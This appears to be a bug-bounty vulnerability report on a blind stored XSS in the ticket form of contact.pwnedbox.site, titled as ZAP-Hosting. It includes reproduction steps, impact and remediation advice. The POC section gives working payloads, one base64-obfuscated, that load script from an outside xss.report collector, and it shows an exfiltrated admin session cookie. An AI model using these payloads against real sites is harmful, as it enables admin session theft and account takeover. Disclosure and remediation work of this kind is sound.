## Title
Blind XSS in Support Ticket Creation Form Fields - ZAP-Hosting

## Description
**Affected URL:** https://contact.pwnedbox.site/# (triggers on https://contact.pwnedbox.site/index.php?view=admin and https://contact.pwnedbox.site/index.php?view=ticket&id=3)

A Blind Cross-Site Scripting (XSS) vulnerability exists in the "Create ticket via mail" modal form on `contact.pwnedbox.site`. Input submitted in the **Your name (optional)**, **Subject**, and **Your message** fields is stored without HTML encoding and renders directly in the DOM when an administrator views the admin panel (`?view=admin`) or opens the individual ticket (`?view=ticket&id=3`). Because the script executes inside an authenticated admin session, an attacker can exfiltrate the administrator's session cookie and compromise the admin panel.

## Steps to Reproduce
1. Go to `https://contact.pwnedbox.site/#`, open the **Create ticket via mail** form, enter a Blind XSS payload into **Your name (optional)**, **Subject**, and **Your message**, complete the CAPTCHA, and click **Submit**.
2. Log in to the admin panel (`https://contact.pwnedbox.site/index.php?view=admin`) and open the submitted ticket (`?view=ticket&id=3`).
3. Observe the payload execute immediately on both the admin panel and the ticket details page, sending out-of-band callbacks with the admin's `PHPSESSID` cookie and page details.

## POC (Proof of Concept)
**Injection Endpoint:** `https://contact.pwnedbox.site/#` (`Your name (optional)`, `Subject`, and `Your message` fields)

**Trigger Endpoint:** `https://contact.pwnedbox.site/index.php?view=admin` (and `https://contact.pwnedbox.site/index.php?view=ticket&id=3`)

**Payload:**
```html
"><script src=[https://xss.report/c/havemercy](https://xss.report/c/havemercy)></script>
```
*(Alternative payload submitted in Your message: `"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3JhcGlkbmV3dDYzMTAxIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>`)*

**Out-of-Band Callback Data Captured:**
- **Triggered URI:** `https://contact.pwnedbox.site/index.php?view=admin`
- **Referrer:** `https://contact.pwnedbox.site/?view=admin_login`
- **Exfiltrated Session Cookie:** `PHPSESSID=7b17fe6559ea2aed98e59f498e3ba1df`

**Visual Evidence:**
- Ticket creation modal on `contact.pwnedbox.site/#` with the Blind XSS payloads entered in **Your name (optional)**, **Subject**, and **Your message**.
  <img width="1742" height="772" alt="image" src="https://github.com/user-attachments/assets/c460725f-762c-49d3-bb3b-6855d67ae45b" /><br><br>

- Admin ticket view (`/index.php?view=ticket&id=3`) displaying the rendered broken image icon inside **MESSAGE** and unencoded **NAME (OPTIONAL)** and **SUBJECT** fields (`">`).
  <img width="1642" height="946" alt="image" src="https://github.com/user-attachments/assets/cff0fb4c-837d-4a3f-91ac-71819a5af99a" /><br><br>

- Blind XSS collector report confirming execution on `/index.php?view=admin` and capturing the admin's `PHPSESSID` cookie and screenshot.
  <img width="1576" height="1090" alt="image" src="https://github.com/user-attachments/assets/7f0af973-5a09-42b5-b384-3fcf047d6530" /><br>


## Impact
Because the payload executes automatically when an administrator opens the admin dashboard or views incoming support tickets:
- **Admin Account Takeover:** Attackers can steal the administrator's `PHPSESSID` cookie and hijack their active session.
- **Unauthorized Data Access:** Full access to view or manage all submitted support tickets, user email addresses, IP addresses, and User-Agent logs.
- **Persistent Compromise:** Attackers can use the hijacked admin session to perform unauthorized administrative actions across the application.

## Remediation
1. **Encode Output:** Apply `htmlspecialchars($input, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` to all user-supplied ticket fields (`Your name`, `Subject`, and `Your message`) before rendering them in `?view=admin` and `?view=ticket`.
2. **Protect Session Cookies:** Set the `HttpOnly`, `Secure`, and `SameSite=Strict` flags on `PHPSESSID` so JavaScript cannot access session tokens via `document.cookie`.
3. **Add a Content Security Policy (CSP):** Enforce a strict CSP header on admin views (e.g., `default-src 'self'; script-src 'self';`) to block unauthorized external script sources and inline event handlers.
